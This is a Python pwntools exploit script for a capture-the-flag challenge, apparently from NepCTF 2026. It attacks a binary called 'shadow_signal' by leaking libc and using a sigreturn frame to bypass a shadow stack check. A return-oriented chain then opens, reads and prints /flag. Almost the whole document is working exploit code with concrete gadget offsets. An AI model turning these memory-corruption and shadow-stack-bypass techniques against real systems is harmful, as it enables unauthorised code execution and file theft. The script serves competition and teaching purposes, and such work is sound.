"""
shadow_signal - SROP exploit with shadow stack bypass
NepCTF 2026

Key techniques:
1. SROP (Sigreturn-Oriented Programming) to bypass shadow stack check
   - Preserve return address (restore_rt) at [rbp+0x8] for check
   - Overwrite ucontext above it to control all registers on sigreturn
2. Pad SROP payload to 0x500 bytes to avoid TCP data mixing
3. Use pop rdx; pop rbx; ret (NOT pop rdx; ret) since the latter
   is in non-executable memory at 0x47ce
4. ORW chain: open("/flag") -> read(fd, buf) -> write(1, buf)
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# libc offsets (glibc 2.35)
STDOUT_OFFSET     = 0x21b780
RESTORE_RT_OFFSET = 0x42520   # __restore_rt: mov rax,0xf; syscall
SYSCALL_RET       = 0x91316   # syscall; ret
POP_RDI_RET       = 0x2a3e5   # pop rdi; ret
POP_RSI_RET       = 0x2be51   # pop rsi; ret
POP_RDX_RBX_RET   = 0x904a9   # pop rdx; pop rbx; ret (in .text segment!)
POP_RAX_RET       = 0x45eb0   # pop rax; ret
XCHG_EAX_EDI_RET  = 0x164f9e  # xchg eax, edi; ret

# BSS (within bss_reserve: 0x404060 - 0x407060)
BSS_ADDR      = 0x404800
FLAG_STR_ADDR = BSS_ADDR + 0x100
FLAG_BUF_ADDR = BSS_ADDR + 0x200

#io = remote("ytdc6n56-8ihr-eamk-ebhu-6a5a1fb031393-neptune.nepctf.com", 443, ssl=True)
io = process("./shadow_signal")

# ---- Step 1: libc leak ----
io.recvuntil(b"gift: ")
leak = int(io.recvuntil(b"\n", drop=True), 16)
libc = leak - STDOUT_OFFSET
log.success(f"libc: {hex(libc)}")

rrt   = libc + RESTORE_RT_OFFSET
sret  = libc + SYSCALL_RET
prdi  = libc + POP_RDI_RET
prsi  = libc + POP_RSI_RET
prdxb = libc + POP_RDX_RBX_RET
prax  = libc + POP_RAX_RET
xchg  = libc + XCHG_EAX_EDI_RET

# ---- Step 2: trigger SIGSEGV via puts(unmapped) ----
io.send(p64(0x4141414141414141))
io.recvuntil(b"signal\n")

# ---- Step 3: SROP payload -> read(0, BSS, 0x500) ----
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0; frame.rdi = 0
frame.rsi = BSS_ADDR; frame.rdx = 0x500
frame.rsp = BSS_ADDR; frame.rip = sret
frame.eflags = 0x202; frame.csgsfs = 0x33
frame['uc_stack.ss_flags'] = 2  # SS_DISABLE (critical!)

payload  = b"\x00" * 0x110 + p64(0) + p64(rrt) + bytes(frame)
payload += b"\x00" * (0x500 - len(payload))  # pad to avoid TCP mixing
io.send(payload)
sleep(1)

# ---- Step 4: ORW ROP chain ----
rop  = b""
# open("/flag", O_RDONLY)
rop += p64(prdi) + p64(FLAG_STR_ADDR)
rop += p64(prsi) + p64(0)
rop += p64(prax) + p64(2)
rop += p64(sret)
# read(fd, buf, 0x100) - fd via xchg
rop += p64(xchg)
rop += p64(prsi) + p64(FLAG_BUF_ADDR)
rop += p64(prdxb) + p64(0x100) + p64(0)  # rdx=0x100, rbx=dummy
rop += p64(prax) + p64(0)
rop += p64(sret)
# write(1, buf, 0x100)
rop += p64(prdi) + p64(1)
rop += p64(prsi) + p64(FLAG_BUF_ADDR)
rop += p64(prdxb) + p64(0x100) + p64(0)
rop += p64(prax) + p64(1)
rop += p64(sret)

rop += b"\x00" * (FLAG_STR_ADDR - BSS_ADDR - len(rop))
rop += b"/flag\x00"
io.send(rop)

# ---- Receive flag ----
sleep(0.5)
data = io.recvall(timeout=5)
# Extract flag (before any crash message)
flag = data.split(b'\n')[0] if data else b''
log.success(f"Flag: {flag.decode()}")
io.close()
